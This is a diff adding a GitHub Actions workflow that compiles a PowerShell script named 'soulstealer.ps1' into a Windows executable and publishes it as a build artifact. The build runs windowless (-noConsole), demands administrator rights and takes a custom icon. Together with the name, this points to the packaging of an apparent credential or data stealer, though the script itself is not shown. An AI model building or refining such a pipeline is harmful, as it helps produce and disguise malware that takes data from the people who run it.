@@ -1,0 +1,31 @@
+name: Build SoulStealer EXE
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:  # Чтобы можно было запустить вручную
+
+jobs:
+  build:
+    runs-on: windows-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Install PS2EXE
+        shell: powershell
+        run: |
+          Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
+          Install-Module ps2exe -Force -Scope CurrentUser
+
+      - name: Compile ps1 to exe
+        shell: powershell
+        run: |
+          Invoke-ps2exe .\soulstealer.ps1 .\soulstealer.exe -noConsole -requireAdmin -icon .\icon.ico
+
+      - name: Upload EXE
+        uses: actions/upload-artifact@v4
+        with:
+          name: SoulStealer-EXE
+          path: soulstealer.exe
